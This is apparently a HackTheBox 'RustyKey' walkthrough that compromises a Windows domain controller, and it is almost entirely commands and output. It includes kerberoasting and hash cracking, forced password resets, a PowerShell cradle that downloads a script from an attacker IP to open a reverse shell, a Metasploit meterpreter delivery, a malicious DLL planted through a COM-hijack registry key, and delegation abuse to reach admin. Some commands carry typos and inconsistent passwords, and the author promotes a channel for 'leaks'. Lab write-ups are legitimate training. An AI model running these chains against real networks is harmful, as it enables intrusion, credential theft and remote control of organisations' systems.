**Platform:** Windows\
**IP:** 10.129.105.53\
**Difficulty:** Hard\
**Author:** NoSec

> 🚨 **Follow live on HTB — leaks, drops, and in-depth writeups**\
> 👉 [t.me/nosecpwn](https://t.me/nosecpwn)\
> *Don't read. Join.*

---

## Recon

```bash
nmap -sC -sV -Pn 10.129.105.53
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-28 23:25 CEST
Stats: 0:00:11 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 83.33% done; ETC: 23:25 (0:00:01 remaining)
Nmap scan report for 10.129.188.219
Host is up (0.099s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-29 05:25:30Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: rustykey.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: 7h59m47s
| smb2-time: 
|   date: 2025-06-29T05:25:41
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 40.65 seconds
```

We are given a valid credential pair right away:

```
rr.parker / 8#t5HE8L!W3A
```

Edit the hosts file:

```bash
sudo nano /etc/hosts
10.129.105.53		rustykey.htb dc.rustykey.htb
```

Time synchronization is important:

```bash
sudo rdate -n RUSTYKEY.HTB
```

## Bloodhound

```bash
bloodhound-python -u 'rr.parker' -p '8#t5HE8L!W3A' -d rustykey.htb -dc dc.rustykey.htb -gc dc.rustykey.htb -ns 10.129.105.53--disable-autogc -c all --zip
```

IT-COMPUTER3 has permission to add itself to the HELPDESK group, which has ForceChangePassword privileges over BB.Morgan — we'll abuse that.

Let's retrieve the password hash:

```bash
impacket-GetUserSPNs 'rustykey.htb/rr.parker:8#t5HE8L!W3A' -k -request -dc-ip 110.129.105.53-dc-host dc.rustykey.htb -usersfile users.txt -outputfile comp3.hash
```

Crack with Hashcat:

```bash
hashcat -m 13100 comp3.hash /usr/share/wordlists/rockyou.txt
```

Password: Rus<pass>

## Group Add + Password Reset

```bash
bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rus<pass>' -k add groupMember HELPDESK 'IT-COMPUTER3$'
[+] IT-COMPUTER3$ added to HELPDESK
```

```bash
bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rus<pass>' -k set password BB.MORGAN 'Password1234'
[+] Password changed successfully!
```

```bash
bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rus<pass>' -k set password EE.REED 'Password123'
[+] Password changed successfully!
```

## Remove from Protected Objects

```bash
bloodyAD --host dc.rustykey.htb -d rustykey.htb -u 'IT-COMPUTER3$' -p 'Rusty88!' -k remove groupMember 'PROTECTED OBJECTS' 'IT'
[-] IT removed from PROTECTED OBJECTS
```

## Kerberos Configuration

```bash
sudo nano /etc/krb5.conf
```

```
[libdefaults]
    default_realm = RUSTYKEY.HTB
    dns_lookup_realm = false
    dns_lookup_kdc = false
    forwardable = true
    rdns = false

[realms]
    RUSTYKEY.HTB = {
        kdc = dc.rustykey.htb
        admin_server = dc.rustykey.htb
    }

[domain_realm]
    .rustykey.htb = RUSTYKEY.HTB
    rustykey.htb = RUSTYKEY.HTB
```

## User Flag

```bash
impacket-getTGT 'RUSTYKEY.HTB/BB.MORGAN:Password1234'
export KRB5CCNAME=BB.MORGAN.ccache
```
```bash
└─$ evil-winrm -i dc.rustykey.htb -r RUSTYKEY.HTB
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> ls
*Evil-WinRM* PS C:\Users\bb.morgan\Documents> cd ..
*Evil-WinRM* PS C:\Users\bb.morgan> cd Desktop
*Evil-WinRM* PS C:\Users\bb.morgan\Desktop> ls


    Directory: C:\Users\bb.morgan\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-a----         6/4/2025   9:15 AM           1976 internal.pdf
-ar---        6/29/2025  12:56 PM             34 user.txt
```

## Reverse Shell as ee.reed

```bash
rlwrap nc -lvnp 5566
```

```bash
IEX (New-Object Net.WebClient).DownloadString('http://10.10.14.90:8888/Invoke-RunasCs.ps1'); Invoke-RunasCs -Username ee.reed -Password Password123! -Command cmd.exe -Remote 10.10.14.90:5566
```

## Web Delivery and COM Hijack, mm.turner reverse shell

```bash
rlwrap msfconsole -q -x 'use exploit/multi/script/web_delivery; set SRVPORT 8899; set LPORT 8989; set LHOST tun0; set TARGET PSH; set PAYLOAD windows/x64/meterpreter/reverse_tcp; run'
```

After that runs, execute the generated PS command on the target.

```bash
msfvenom -p windows/x64/exec CMD='<base64_encoded_ps>' EXITFUNC=none -f dll > x.dll
```

```bash
curl http://10.10.14.90:8888/x.dll -o \programdata\x.dll
```

```bash
reg add "HKLM\SOFTWARE\Classes\CLSID\{23170F69-40C1-278A-1000-000100020000}\InprocServer32" /ve /t REG_SZ /d "C:\\programdata\\x.dll" /f
```

```bash
rundll32.exe C:\\programdata\\x.dll,DllRegisterServer
```

## RBCD with mm.turner

```bash
Set-ADComputer -Identity DC -PrincipalsAllowedToDelegateToAccount IT-COMPUTER3$
```

```bash
impacket-getST -spn 'cifs/DC.rustykey.htb' -impersonate backupadmin -dc-ip $ip -k 'RUSTYKEY.HTB/IT-COMPUTER3$:Rus<pass>
```

```bash
export KRB5CCNAME=backupadmin@cifs_DC.rustykey.htb@RUSTYKEY.HTB.ccache
```

## Root flag

```bash
timpacket-smbexec -k -no-pass 'RUSTYKEY.HTB/backupadmin@dc.rustykey.htb'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>dir C:\Users\Administrator\Desktop
 Volume in drive C has no label.
 Volume Serial Number is 00BA-0DBE

 Directory of C:\Users\Administrator\Desktop

06/24/2025  10:00 AM    <DIR>          .
06/24/2025  10:00 AM    <DIR>          ..
06/30/2025  07:32 AM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   2,911,215,616 bytes free
               
type C:\Users\Administrator\Desktop\root.txt
```
---

> Follow for more writeups, real-time leaks, and educational content: **👉 **[**https://t.me/nosecpwn**](https://t.me/nosecpwn)

